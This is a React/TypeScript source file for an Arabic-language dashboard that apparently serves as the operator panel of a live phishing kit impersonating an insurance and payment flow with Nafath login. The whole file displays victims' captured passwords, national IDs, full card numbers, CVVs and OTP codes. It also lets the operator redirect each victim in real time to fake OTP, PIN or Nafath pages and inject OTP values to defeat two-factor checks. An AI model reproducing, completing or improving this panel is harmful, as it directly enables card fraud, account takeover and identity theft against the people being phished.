import { useState, useEffect, useRef } from "react";
import {
  Search, Wifi, WifiOff, Trash2, ArrowRight, Bell, CreditCard,
  X, ChevronLeft, ChevronRight, FileText, Phone, Globe,
  CheckSquare, Square, Eye, EyeOff, Send, RotateCcw,
} from "lucide-react";
import { projectApi } from "@/lib/api";
import type { ProjectInfo } from "@/lib/api";

// ── Constants ─────────────────────────────────────────────────────────────────
const POLL = 3000;
const BG    = "#0B0F17";
const CARD  = "#111827";
const MODAL = "#1C1C1F";
const BORDER = "#232A36";
const TEXT_P = "#F5F7FA";
const TEXT_S = "#9CA3AF";
const BLUE   = "#2F5BFF";
const RED    = "#D62828";
const GREEN  = "#22C55E";

const ROUTE_OPTIONS = [
  { id: "home",      label: "الرئيسية" },
  { id: "insurance", label: "بيانات التأمين" },
  { id: "compare",   label: "مقارنة العروض" },
  { id: "card",      label: "الدفع (بطاقة)" },
  { id: "otp",       label: "OTP" },
  { id: "pin",       label: "PIN" },
  { id: "phone",     label: "معلومات الهاتف" },
  { id: "nafath",    label: "نفاذ" },
  { id: "done",      label: "تمت العملية" },
];

// ── Helpers ───────────────────────────────────────────────────────────────────
function timeAgo(ts: number) {
  const s = Math.floor((Date.now() - ts) / 1000);
  if (s < 60) return `منذ ${s}ث`;
  if (s < 3600) return `منذ ${Math.floor(s / 60)}د`;
  return `منذ ${Math.floor(s / 3600)}س`;
}

function playConnectSound() {
  try {
    const ctx = new (window.AudioContext || (window as any).webkitAudioContext)();
    const now = ctx.currentTime;
    [660, 880, 1100].forEach((freq, i) => {
      const osc = ctx.createOscillator();
      const gain = ctx.createGain();
      osc.connect(gain); gain.connect(ctx.destination);
      osc.type = "sine";
      osc.frequency.setValueAtTime(freq, now + i * 0.12);
      gain.gain.setValueAtTime(0, now + i * 0.12);
      gain.gain.linearRampToValueAtTime(0.25, now + i * 0.12 + 0.02);
      gain.gain.exponentialRampToValueAtTime(0.001, now + i * 0.12 + 0.18);
      osc.start(now + i * 0.12);
      osc.stop(now + i * 0.12 + 0.2);
    });
  } catch {}
}

function initials(v: any) {
  const name = v.name || v.phone || v.email || "";
  return name.trim().slice(0, 2) || "ZZ";
}

function primaryId(v: any): string {
  return v.phone ?? v.email ?? v.id?.slice(0, 8) ?? "—";
}

// ── Sub-components ────────────────────────────────────────────────────────────
function StatusDot({ active }: { active: boolean }) {
  return (
    <span
      className="inline-block w-2 h-2 rounded-full flex-shrink-0"
      style={{ background: active ? GREEN : "#6B7280" }}
    />
  );
}

function Badge({ label, color }: { label: string; color: string }) {
  return (
    <span
      className="inline-block text-[11px] font-bold rounded-full px-2 py-0.5"
      style={{ background: color + "22", color, border: `1px solid ${color}44` }}
    >
      {label}
    </span>
  );
}

// ── Routing Modal ─────────────────────────────────────────────────────────────
function RouteModal({
  visitor,
  apiBase,
  onClose,
}: {
  visitor: any;
  apiBase: string;
  onClose: () => void;
}) {
  const [selected, setSelected] = useState<string>("");
  const [idx, setIdx] = useState(0);

  const navigate = (dir: 1 | -1) => {
    const next = Math.max(0, Math.min(ROUTE_OPTIONS.length - 1, idx + dir));
    setIdx(next);
    setSelected(ROUTE_OPTIONS[next].id);
  };

  const cmdMap: Record<string, string> = {
    home:      "redirect:home",
    insurance: "redirect:insurance",
    compare:   "redirect:compare",
    card:      "redirect:card",
    otp:       "redirect:otp",
    pin:       "redirect:pin",
    phone:     "redirect:phone",
    nafath:    "redirect:nafath",
    done:      "redirect:done",
  };

  async function apply() {
    if (!selected) return;
    await projectApi.sendCmd(apiBase, visitor.id, cmdMap[selected] ?? `redirect:${selected}`);
    onClose();
  }

  return (
    <div
      className="fixed inset-0 z-[200] flex items-center justify-center p-4"
      style={{ background: "rgba(0,0,0,0.75)" }}
      onClick={(e) => e.target === e.currentTarget && onClose()}
    >
      <div
        className="w-full max-w-sm rounded-2xl shadow-2xl p-6 space-y-5"
        style={{ background: MODAL, border: `1px solid ${BORDER}` }}
        dir="rtl"
      >
        {/* Header */}
        <div className="flex items-center justify-between">
          <div className="flex items-center gap-2">
            <button
              onClick={() => navigate(-1)}
              className="w-8 h-8 rounded-lg flex items-center justify-center transition-colors hover:bg-white/10"
              style={{ border: `1px solid ${BORDER}` }}
            >
              <ChevronRight className="w-4 h-4" style={{ color: TEXT_S }} />
            </button>
            <button
              onClick={() => navigate(1)}
              className="w-8 h-8 rounded-lg flex items-center justify-center transition-colors hover:bg-white/10"
              style={{ border: `1px solid ${BORDER}` }}
            >
              <ChevronLeft className="w-4 h-4" style={{ color: TEXT_S }} />
            </button>
          </div>
          <h3 className="font-black text-base" style={{ color: TEXT_P }}>تحويل الزائر</h3>
          <button onClick={onClose} className="text-gray-500 hover:text-white transition-colors">
            <X className="w-5 h-5" />
          </button>
        </div>

        {/* Visitor mini-card */}
        <div
          className="flex items-center gap-3 p-3 rounded-xl"
          style={{ background: CARD, border: `1px solid ${BORDER}` }}
        >
          <div
            className="w-9 h-9 rounded-full flex items-center justify-center text-xs font-black flex-shrink-0"
            style={{ background: BLUE + "33", color: BLUE }}
          >
            {initials(visitor)}
          </div>
          <div className="min-w-0">
            <p className="font-bold text-sm truncate" style={{ color: TEXT_P }}>{primaryId(visitor)}</p>
            <p className="text-xs" style={{ color: TEXT_S }}>{visitor.country || "غير معروف"}</p>
          </div>
          <StatusDot active={visitor.isActive} />
        </div>

        {/* Options */}
        <div className="space-y-2">
          {ROUTE_OPTIONS.map((opt) => (
            <label
              key={opt.id}
              className="flex items-center gap-3 px-4 py-3 rounded-xl cursor-pointer transition-colors"
              style={{
                background: selected === opt.id ? BLUE + "22" : "transparent",
                border: `1px solid ${selected === opt.id ? BLUE + "66" : BORDER}`,
              }}
            >
              <span
                className="w-4 h-4 rounded-full border-2 flex items-center justify-center flex-shrink-0"
                style={{
                  borderColor: selected === opt.id ? BLUE : TEXT_S,
                  background: selected === opt.id ? BLUE : "transparent",
                }}
              >
                {selected === opt.id && <span className="w-1.5 h-1.5 rounded-full bg-white inline-block" />}
              </span>
              <span className="text-sm font-semibold" style={{ color: selected === opt.id ? TEXT_P : TEXT_S }}>
                {opt.label}
              </span>
              <input
                type="radio"
                className="sr-only"
                checked={selected === opt.id}
                onChange={() => { setSelected(opt.id); setIdx(ROUTE_OPTIONS.findIndex(o => o.id === opt.id)); }}
              />
            </label>
          ))}
        </div>

        {/* Apply */}
        <button
          onClick={apply}
          disabled={!selected}
          className="w-full h-12 rounded-xl font-black text-sm text-white transition-opacity hover:opacity-90 disabled:opacity-40"
          style={{ background: BLUE }}
        >
          تطبيق التحويل
        </button>
      </div>
    </div>
  );
}

// ── Visitor Detail Panel ──────────────────────────────────────────────────────
function DetailPanel({
  visitor,
  apiBase,
  onClose,
  onDelete,
}: {
  visitor: any;
  apiBase: string;
  onClose: () => void;
  onDelete: () => void;
}) {
  const [showCvv, setShowCvv] = useState(false);
  const [showRouteModal, setShowRouteModal] = useState(false);
  const [otpInput, setOtpInput] = useState("");
  const [sending, setSending] = useState(false);

  async function sendCmd(cmd: string) {
    setSending(true);
    await projectApi.sendCmd(apiBase, visitor.id, cmd);
    setSending(false);
  }

  async function approveOtp() {
    if (otpInput.trim()) {
      await projectApi.sendCmd(apiBase, visitor.id, `otp:set:${otpInput.trim()}`);
    }
    await projectApi.sendCmd(apiBase, visitor.id, "otp:approved");
  }

  const pageColors: Record<string, string> = {
    "الرئيسية": "#6B7280",
    "بيانات التأمين": BLUE,
    "مقارنة العروض": "#8B5CF6",
    "الدفع (بطاقة)": "#F59E0B",
    "انتظار": "#F59E0B",
    "تحقق OTP": "#22C55E",
    "تم": GREEN,
  };
  const pageColor = pageColors[visitor.page ?? ""] ?? TEXT_S;

  return (
    <>
      {showRouteModal && (
        <RouteModal
          visitor={visitor}
          apiBase={apiBase}
          onClose={() => setShowRouteModal(false)}
        />
      )}

      <div
        className="h-full flex flex-col overflow-hidden"
        style={{ background: BG }}
        dir="rtl"
      >
        {/* Top bar */}
        <div
          className="flex items-center justify-between px-5 py-4 flex-shrink-0"
          style={{ borderBottom: `1px solid ${BORDER}` }}
        >
          <button
            onClick={onClose}
            className="text-gray-500 hover:text-white transition-colors flex items-center gap-1.5 text-sm font-semibold"
          >
            <X className="w-4 h-4" /> إغلاق
          </button>
          <div className="flex items-center gap-2">
            <StatusDot active={visitor.isActive} />
            <span className="text-xs font-semibold" style={{ color: visitor.isActive ? GREEN : TEXT_S }}>
              {visitor.isActive ? "متصل الآن" : "غير متصل"}
            </span>
          </div>
        </div>

        {/* Scrollable content */}
        <div className="flex-1 overflow-y-auto px-5 py-5 space-y-5">

          {/* Hero */}
          <div className="flex items-start gap-4">
            <div
              className="w-14 h-14 rounded-2xl flex items-center justify-center text-lg font-black flex-shrink-0"
              style={{ background: BLUE + "33", color: BLUE, border: `1px solid ${BLUE}44` }}
            >
              {initials(visitor)}
            </div>
            <div className="flex-1 min-w-0">
              <h2 className="font-black text-[28px] leading-tight truncate" style={{ color: TEXT_P }}>
                {visitor.name || primaryId(visitor)}
              </h2>
              <div className="flex flex-wrap items-center gap-2 mt-1">
                {visitor.page && (
                  <Badge label={visitor.page} color={pageColor} />
                )}
                {visitor.country && (
                  <Badge label={visitor.country} color={TEXT_S} />
                )}
                <span className="text-xs" style={{ color: TEXT_S }}>
                  {visitor.lastSeen ? timeAgo(Number(visitor.lastSeen)) : ""}
                </span>
              </div>
            </div>
          </div>

          {/* Action buttons row */}
          <div className="flex flex-wrap gap-2">
            <button
              onClick={() => setShowRouteModal(true)}
              className="flex items-center gap-2 h-11 px-4 rounded-xl font-bold text-sm text-white transition-opacity hover:opacity-90"
              style={{ background: BLUE }}
            >
              <RotateCcw className="w-4 h-4" /> تحويل الزائر
            </button>
            <button
              className="flex items-center gap-2 h-11 px-4 rounded-xl font-bold text-sm text-white transition-opacity hover:opacity-90"
              style={{ background: RED }}
            >
              <FileText className="w-4 h-4" /> تحميل PDF
            </button>
            <button
              onClick={onDelete}
              className="flex items-center gap-2 h-11 px-4 rounded-xl font-bold text-sm transition-colors hover:opacity-90"
              style={{
                background: "transparent",
                border: `1px solid ${BORDER}`,
                color: TEXT_S,
              }}
            >
              <Trash2 className="w-4 h-4" /> حذف
            </button>
          </div>

          {/* Section: معلومات أساسية */}
          <section>
            <h3 className="font-black text-[18px] mb-3" style={{ color: TEXT_P }}>معلومات أساسية</h3>
            <div
              className="rounded-2xl p-4 grid grid-cols-2 gap-4"
              style={{ background: CARD, border: `1px solid ${BORDER}` }}
            >
              {[
                { label: "رقم الجوال", value: visitor.phone, icon: Phone },
                { label: "الدولة", value: visitor.country, icon: Globe },
                { label: "رقم الهوية", value: visitor.nationalId },
                { label: "البريد الإلكتروني", value: visitor.email },
                { label: "كلمة المرور", value: visitor.password },
                { label: "الصفحة الحالية", value: visitor.page },
              ].filter(f => f.value).map(({ label, value, icon: Icon }) => (
                <div key={label}>
                  <p className="text-[11px] font-bold mb-0.5" style={{ color: TEXT_S }}>{label}</p>
                  <div className="flex items-center gap-1.5">
                    {Icon && <Icon className="w-3.5 h-3.5 flex-shrink-0" style={{ color: TEXT_S }} />}
                    <p className="text-sm font-bold truncate" style={{ color: TEXT_P }}>{value}</p>
                  </div>
                </div>
              ))}
            </div>
          </section>

          {/* Section: بيانات البطاقة */}
          {visitor.cardNumber && (
            <section>
              <div className="flex items-center justify-between mb-3">
                <h3 className="font-black text-[18px]" style={{ color: TEXT_P }}>بيانات البطاقة</h3>
                <button
                  onClick={() => setShowCvv(v => !v)}
                  className="flex items-center gap-1.5 text-xs font-bold transition-colors hover:text-white"
                  style={{ color: TEXT_S }}
                >
                  {showCvv ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
                  {showCvv ? "إخفاء" : "إظهار CVV"}
                </button>
              </div>
              <div
                className="rounded-2xl p-4 space-y-3"
                style={{ background: CARD, border: `1px solid ${BORDER}` }}
              >
                {/* Card number display */}
                <div
                  className="rounded-xl p-4"
                  style={{ background: "#0B0F17", border: `1px solid ${BORDER}` }}
                >
                  <p className="text-[11px] font-bold mb-2" style={{ color: TEXT_S }}>رقم البطاقة</p>
                  <p
                    className="text-[22px] font-black tracking-widest font-mono"
                    style={{ color: TEXT_P }}
                    dir="ltr"
                  >
                    {visitor.cardNumber.replace(/(.{4})/g, "$1 ").trim()}
                  </p>
                </div>
                <div className="grid grid-cols-3 gap-3">
                  {visitor.cardName && (
                    <div>
                      <p className="text-[11px] font-bold mb-0.5" style={{ color: TEXT_S }}>الاسم</p>
                      <p className="text-sm font-bold uppercase" style={{ color: TEXT_P }}>{visitor.cardName}</p>
                    </div>
                  )}
                  {(visitor.cardMonth || visitor.cardYearExp) && (
                    <div>
                      <p className="text-[11px] font-bold mb-0.5" style={{ color: TEXT_S }}>الصلاحية</p>
                      <p className="text-sm font-bold font-mono" style={{ color: TEXT_P }} dir="ltr">
                        {visitor.cardMonth}/{visitor.cardYearExp}
                      </p>
                    </div>
                  )}
                  {visitor.cardCvv && (
                    <div>
                      <p className="text-[11px] font-bold mb-0.5" style={{ color: TEXT_S }}>CVV</p>
                      <p className="text-sm font-black font-mono" style={{ color: TEXT_P }}>
                        {showCvv ? visitor.cardCvv : "•••"}
                      </p>
                    </div>
                  )}
                </div>
              </div>
            </section>
          )}

          {/* Section: العرض المختار / OTP */}
          <section>
            <h3 className="font-black text-[18px] mb-3" style={{ color: TEXT_P }}>OTP والتحقق</h3>
            <div
              className="rounded-2xl p-4 space-y-4"
              style={{ background: CARD, border: `1px solid ${BORDER}` }}
            >
              {/* Current OTP */}
              {visitor.otpCode && (
                <div
                  className="flex items-center justify-between px-4 py-3 rounded-xl"
                  style={{ background: "#22C55E11", border: "1px solid #22C55E33" }}
                >
                  <span className="text-xs font-bold" style={{ color: TEXT_S }}>OTP المُدخل</span>
                  <span className="font-black text-lg tracking-widest" style={{ color: GREEN }}>
                    {visitor.otpCode}
                  </span>
                </div>
              )}

              {/* OTP input */}
              <div className="space-y-2">
                <label className="text-xs font-bold block" style={{ color: TEXT_S }}>إرسال / تأكيد OTP</label>
                <div className="flex gap-2">
                  <input
                    type="text"
                    placeholder="أدخل رمز OTP"
                    value={otpInput}
                    onChange={e => setOtpInput(e.target.value)}
                    className="flex-1 h-12 rounded-xl px-4 text-sm font-bold outline-none"
                    style={{
                      background: BG,
                      border: `1px solid ${BORDER}`,
                      color: TEXT_P,
                    }}
                    dir="ltr"
                  />
                  <button
                    onClick={() => sendCmd(`otp:set:${otpInput}`)}
                    disabled={sending || !otpInput}
                    className="h-12 px-4 rounded-xl font-bold text-sm text-white transition-opacity hover:opacity-90 disabled:opacity-40"
                    style={{ background: BLUE }}
                  >
                    إرسال
                  </button>
                </div>
              </div>

              {/* Quick OTP actions */}
              <div className="grid grid-cols-2 gap-2">
                <button
                  onClick={approveOtp}
                  disabled={sending}
                  className="h-12 rounded-xl font-black text-sm text-white transition-opacity hover:opacity-90 disabled:opacity-40"
                  style={{ background: "#16a34a" }}
                >
                  ✓ قبول OTP النهائي
                </button>
                <button
                  onClick={() => sendCmd("otp:rejected")}
                  disabled={sending}
                  className="h-12 rounded-xl font-black text-sm text-white transition-opacity hover:opacity-90 disabled:opacity-40"
                  style={{ background: RED }}
                >
                  ✗ رفض OTP
                </button>
              </div>
            </div>
          </section>

          {/* Section: تفاصيل إضافية */}
          {(visitor.carPlate || visitor.carMake || visitor.carYear || visitor.name) && (
            <section>
              <h3 className="font-black text-[18px] mb-3" style={{ color: TEXT_P }}>تفاصيل إضافية</h3>
              <div
                className="rounded-2xl p-4 grid grid-cols-2 gap-4"
                style={{ background: CARD, border: `1px solid ${BORDER}` }}
              >
                {[
                  { label: "الاسم", value: visitor.name },
                  { label: "لوحة السيارة", value: visitor.carPlate },
                  { label: "نوع السيارة", value: visitor.carMake },
                  { label: "سنة السيارة", value: visitor.carYear },
                ].filter(f => f.value).map(({ label, value }) => (
                  <div key={label}>
                    <p className="text-[11px] font-bold mb-0.5" style={{ color: TEXT_S }}>{label}</p>
                    <p className="text-sm font-bold" style={{ color: TEXT_P }}>{value}</p>
                  </div>
                ))}
              </div>
            </section>
          )}

          {/* Commands section */}
          <section>
            <h3 className="font-black text-[18px] mb-3" style={{ color: TEXT_P }}>الأوامر السريعة</h3>
            <div
              className="rounded-2xl p-4"
              style={{ background: CARD, border: `1px solid ${BORDER}` }}
            >
              <div className="flex flex-wrap gap-2">
                {[
                  { cmd: "redirect:otp",    label: "طلب OTP",        bg: "#F59E0B22", border: "#F59E0B44", color: "#F59E0B" },
                  { cmd: "redirect:card",   label: "طلب بطاقة",      bg: "#8B5CF622", border: "#8B5CF644", color: "#8B5CF6" },
                  { cmd: "redirect:home",   label: "الرئيسية",        bg: "#6B728022", border: "#6B728044", color: TEXT_S },
                  { cmd: "redirect:login",  label: "↩ تسجيل الدخول", bg: BLUE + "22", border: BLUE + "44", color: BLUE },
                  { cmd: "redirect:reject", label: "✗ رفض",          bg: RED + "22",  border: RED + "44",  color: RED },
                ].map(({ cmd, label, bg, border, color }) => (
                  <button
                    key={cmd}
                    onClick={() => sendCmd(cmd)}
                    disabled={sending}
                    className="flex items-center gap-1.5 h-9 px-3 rounded-xl font-bold text-xs transition-opacity hover:opacity-80 disabled:opacity-40"
                    style={{ background: bg, border: `1px solid ${border}`, color }}
                  >
                    <Send className="w-3 h-3" /> {label}
                  </button>
                ))}
              </div>
            </div>
          </section>

          {/* Raw JSON */}
          <details className="group">
            <summary
              className="text-xs font-bold cursor-pointer hover:text-white list-none flex items-center gap-1 mb-2 select-none"
              style={{ color: TEXT_S }}
            >
              <span className="group-open:hidden">▶</span>
              <span className="hidden group-open:inline">▼</span>
              جميع البيانات الخام
            </summary>
            <div
              className="rounded-xl p-3 text-xs font-mono overflow-x-auto"
              style={{ background: "#000", color: "#22C55E", border: `1px solid ${BORDER}` }}
            >
              <pre>{JSON.stringify(visitor, null, 2)}</pre>
            </div>
          </details>

          <div className="h-4" />
        </div>
      </div>
    </>
  );
}

// ── Visitor Card (in list) ────────────────────────────────────────────────────
function VisitorCard({
  visitor,
  selected,
  checked,
  onSelect,
  onCheck,
}: {
  visitor: any;
  selected: boolean;
  checked: boolean;
  onSelect: () => void;
  onCheck: (c: boolean) => void;
}) {
  return (
    <div
      onClick={onSelect}
      className="flex items-start gap-3 px-4 py-4 rounded-[14px] cursor-pointer transition-all"
      style={{
        background: selected ? BLUE + "1A" : CARD,
        border: `1px solid ${selected ? BLUE + "66" : BORDER}`,
        marginBottom: "8px",
      }}
    >
      {/* Checkbox */}
      <button
        onClick={e => { e.stopPropagation(); onCheck(!checked); }}
        className="flex-shrink-0 mt-0.5 transition-colors"
      >
        {checked
          ? <CheckSquare className="w-4 h-4" style={{ color: BLUE }} />
          : <Square className="w-4 h-4" style={{ color: TEXT_S }} />
        }
      </button>

      {/* Avatar */}
      <div
        className="w-10 h-10 rounded-full flex items-center justify-center text-xs font-black flex-shrink-0"
        style={{ background: BLUE + "33", color: BLUE }}
      >
        {initials(visitor)}
      </div>

      {/* Info */}
      <div className="flex-1 min-w-0">
        <div className="flex items-center gap-2 mb-1">
          <span className="font-bold text-sm truncate" style={{ color: TEXT_P }}>
            {visitor.name || primaryId(visitor)}
          </span>
          <StatusDot active={visitor.isActive} />
        </div>
        {visitor.phone && (
          <div className="flex items-center gap-1 mb-1">
            <Phone className="w-3 h-3 flex-shrink-0" style={{ color: TEXT_S }} />
            <span className="text-xs font-mono truncate" style={{ color: TEXT_S }}>{visitor.phone}</span>
          </div>
        )}
        {visitor.nationalId && (
          <p className="text-[11px] font-semibold truncate" style={{ color: TEXT_S }}>
            الهوية: {visitor.nationalId}
          </p>
        )}
        <div className="flex flex-wrap items-center gap-1.5 mt-1.5">
          {visitor.page && (
            <Badge label={visitor.page} color={TEXT_S} />
          )}
          {visitor.cardNumber && (
            <Badge label="بطاقة" color="#F59E0B" />
          )}
          {visitor.otpCode && (
            <Badge label="OTP" color={GREEN} />
          )}
          <span className="text-[10px]" style={{ color: TEXT_S }}>
            {visitor.lastSeen ? timeAgo(Number(visitor.lastSeen)) : ""}
          </span>
        </div>
      </div>
    </div>
  );
}

// ── Main Component ────────────────────────────────────────────────────────────
interface Props {
  project: ProjectInfo;
  onBack: () => void;
}

type FilterType = "all" | "card" | "otp";

export default function ProjectDashboard({ project, onBack }: Props) {
  const [entries, setEntries] = useState<any[]>([]);
  const [selectedId, setSelectedId] = useState<string | null>(null);
  const [checkedIds, setCheckedIds] = useState<Set<string>>(new Set());
  const [search, setSearch] = useState("");
  const [filter, setFilter] = useState<FilterType>("all");
  const [newAlert, setNewAlert] = useState<string | null>(null);
  const knownIds = useRef<Set<string>>(new Set());
  const isFirst = useRef(true);

  useEffect(() => {
    setEntries([]);
    setSelectedId(null);
    setCheckedIds(new Set());
    knownIds.current = new Set();
    isFirst.current = true;

    const load = async () => {
      const data = await projectApi.getSubmissions(project.apiBase);

      if (isFirst.current) {
        data.forEach((v: any) => knownIds.current.add(v.id));
        isFirst.current = false;
      } else {
        const fresh = data.filter((v: any) => !knownIds.current.has(v.id));
        if (fresh.length > 0) {
          playConnectSound();
          const label = fresh[0].phone ?? fresh[0].email ?? "زائر جديد";
          setNewAlert(label);
          setTimeout(() => setNewAlert(null), 4000);
          fresh.forEach((v: any) => knownIds.current.add(v.id));
        }
      }

      setEntries(data);
    };

    load();
    const iv = setInterval(load, POLL);
    return () => clearInterval(iv);
  }, [project.key, project.apiBase]);

  // Filtered list
  const filtered = entries.filter(v => {
    const term = search.trim().toLowerCase();
    const matchSearch = !term ||
      (v.phone ?? "").toLowerCase().includes(term) ||
      (v.name ?? "").toLowerCase().includes(term) ||
      (v.nationalId ?? "").toLowerCase().includes(term) ||
      (v.email ?? "").toLowerCase().includes(term);

    const matchFilter =
      filter === "all" ? true :
      filter === "card" ? !!v.cardNumber :
      filter === "otp"  ? !!v.otpCode : true;

    return matchSearch && matchFilter;
  });

  const selectedVisitor = entries.find(v => v.id === selectedId) ?? null;
  const liveCount = entries.filter(v => v.isActive).length;

  // Bulk select all
  const toggleSelectAll = () => {
    if (checkedIds.size === filtered.length) {
      setCheckedIds(new Set());
    } else {
      setCheckedIds(new Set(filtered.map(v => v.id)));
    }
  };

  async function deleteChecked() {
    for (const id of Array.from(checkedIds)) {
      await projectApi.deleteOne(project.apiBase, id);
    }
    setEntries(es => es.filter(v => !checkedIds.has(v.id)));
    if (selectedId && checkedIds.has(selectedId)) setSelectedId(null);
    setCheckedIds(new Set());
  }

  async function deleteVisitor(id: string) {
    await projectApi.deleteOne(project.apiBase, id);
    setEntries(es => es.filter(v => v.id !== id));
    if (selectedId === id) setSelectedId(null);
  }

  const FILTER_TABS: { key: FilterType; label: string }[] = [
    { key: "all",  label: "الكل" },
    { key: "card", label: "لديهم بطاقة" },
    { key: "otp",  label: "لديهم OTP" },
  ];

  return (
    <div
      className="flex flex-col h-full"
      style={{ background: BG, fontFamily: "'Cairo', system-ui, sans-serif" }}
      dir="rtl"
    >
      {/* New visitor toast */}
      {newAlert && (
        <div
          className="fixed top-5 left-1/2 z-[300] flex items-center gap-3 px-5 py-3 rounded-2xl shadow-2xl text-white font-black text-sm"
          style={{
            transform: "translateX(-50%)",
            background: "linear-gradient(135deg, #16a34a, #15803d)",
            boxShadow: "0 8px 32px rgba(22,163,74,0.55)",
            minWidth: "240px",
          }}
        >
          <Bell className="w-5 h-5 flex-shrink-0" />
          <span>🟢 زائر جديد — {newAlert}</span>
        </div>
      )}

      {/* Top header */}
      <div
        className="flex items-center gap-3 px-5 h-14 flex-shrink-0"
        style={{ borderBottom: `1px solid ${BORDER}`, background: CARD }}
      >
        <button
          onClick={onBack}
          className="flex items-center gap-1.5 text-sm font-bold transition-colors hover:text-white"
          style={{ color: TEXT_S }}
        >
          <ArrowRight className="w-4 h-4" /> المشاريع
        </button>
        <span style={{ color: BORDER }}>/</span>
        <span className="font-black text-sm" style={{ color: TEXT_P }}>{project.label}</span>

        {/* Live indicator */}
        <div
          className="mr-auto flex items-center gap-2 px-3 py-1 rounded-full"
          style={{ background: GREEN + "18", border: `1px solid ${GREEN}33` }}
        >
          <span className="w-2 h-2 rounded-full animate-pulse" style={{ background: GREEN }} />
          <span className="text-xs font-bold" style={{ color: GREEN }}>{liveCount} متصل</span>
        </div>

        {/* Delete all */}
        <button
          onClick={() => projectApi.deleteAll(project.apiBase).then(() => { setEntries([]); setSelectedId(null); })}
          className="flex items-center gap-1.5 h-8 px-3 rounded-xl font-bold text-xs transition-opacity hover:opacity-80"
          style={{ background: RED + "22", border: `1px solid ${RED}44`, color: RED }}
        >
          <Trash2 className="w-3.5 h-3.5" /> حذف الكل
        </button>
      </div>

      {/* Body: split panel */}
      <div className="flex flex-1 overflow-hidden">

        {/* ── RIGHT: Visitors list ─────────────────────────────────────────── */}
        <div
          className="flex flex-col flex-shrink-0 overflow-hidden"
          style={{
            width: selectedVisitor ? "360px" : "100%",
            borderLeft: selectedVisitor ? `1px solid ${BORDER}` : "none",
          }}
        >
          {/* List header */}
          <div className="px-4 pt-4 pb-2 flex-shrink-0 space-y-3">
            <div className="flex items-center justify-between">
              <h2 className="font-black text-[22px]" style={{ color: TEXT_P }}>قائمة الزوار</h2>
              <span className="text-sm font-bold" style={{ color: TEXT_S }}>
                {filtered.length} زائر
              </span>
            </div>

            {/* Search */}
            <div
              className="flex items-center gap-2 h-12 px-3 rounded-[14px]"
              style={{ background: CARD, border: `1px solid ${BORDER}` }}
            >
              <Search className="w-4 h-4 flex-shrink-0" style={{ color: TEXT_S }} />
              <input
                type="text"
                placeholder="بحث بالاسم، الجوال، الهوية..."
                value={search}
                onChange={e => setSearch(e.target.value)}
                className="flex-1 bg-transparent text-sm font-semibold outline-none"
                style={{ color: TEXT_P }}
              />
              {search && (
                <button onClick={() => setSearch("")} style={{ color: TEXT_S }}>
                  <X className="w-4 h-4" />
                </button>
              )}
            </div>

            {/* Filters */}
            <div className="flex items-center gap-2">
              {FILTER_TABS.map(tab => (
                <button
                  key={tab.key}
                  onClick={() => setFilter(tab.key)}
                  className="flex-1 h-9 rounded-xl text-xs font-bold transition-all"
                  style={{
                    background: filter === tab.key ? BLUE : CARD,
                    color: filter === tab.key ? "#fff" : TEXT_S,
                    border: `1px solid ${filter === tab.key ? BLUE : BORDER}`,
                  }}
                >
                  {tab.label}
                </button>
              ))}
              <button
                onClick={toggleSelectAll}
                className="flex-1 h-9 rounded-xl text-xs font-bold transition-all"
                style={{
                  background: checkedIds.size > 0 && checkedIds.size === filtered.length ? BLUE + "22" : CARD,
                  color: TEXT_S,
                  border: `1px solid ${BORDER}`,
                }}
              >
                {checkedIds.size > 0 && checkedIds.size === filtered.length ? "إلغاء التحديد" : "تحديد الكل"}
              </button>
            </div>

            {/* Bulk action bar */}
            {checkedIds.size > 0 && (
              <div
                className="flex items-center justify-between px-3 py-2 rounded-xl"
                style={{ background: BLUE + "22", border: `1px solid ${BLUE}44` }}
              >
                <span className="text-xs font-bold" style={{ color: BLUE }}>
                  {checkedIds.size} محدد
                </span>
                <button
                  onClick={deleteChecked}
                  className="flex items-center gap-1 text-xs font-bold"
                  style={{ color: RED }}
                >
                  <Trash2 className="w-3.5 h-3.5" /> حذف المحدد
                </button>
              </div>
            )}
          </div>

          {/* List */}
          <div className="flex-1 overflow-y-auto px-4 py-2">
            {filtered.length === 0 ? (
              <div className="flex flex-col items-center justify-center h-40 gap-3">
                <Wifi className="w-10 h-10" style={{ color: BORDER }} />
                <p className="text-sm font-semibold" style={{ color: TEXT_S }}>
                  {entries.length === 0 ? "لا يوجد زوار حتى الآن" : "لا توجد نتائج مطابقة"}
                </p>
              </div>
            ) : (
              filtered.map(v => (
                <VisitorCard
                  key={v.id}
                  visitor={v}
                  selected={selectedId === v.id}
                  checked={checkedIds.has(v.id)}
                  onSelect={() => setSelectedId(selectedId === v.id ? null : v.id)}
                  onCheck={c => {
                    const next = new Set(checkedIds);
                    c ? next.add(v.id) : next.delete(v.id);
                    setCheckedIds(next);
                  }}
                />
              ))
            )}
            <div className="h-4" />
          </div>
        </div>

        {/* ── LEFT: Visitor detail ─────────────────────────────────────────── */}
        {selectedVisitor && (
          <div className="flex-1 overflow-hidden min-w-0">
            <DetailPanel
              visitor={selectedVisitor}
              apiBase={project.apiBase}
              onClose={() => setSelectedId(null)}
              onDelete={() => deleteVisitor(selectedVisitor.id)}
            />
          </div>
        )}
      </div>
    </div>
  );
}
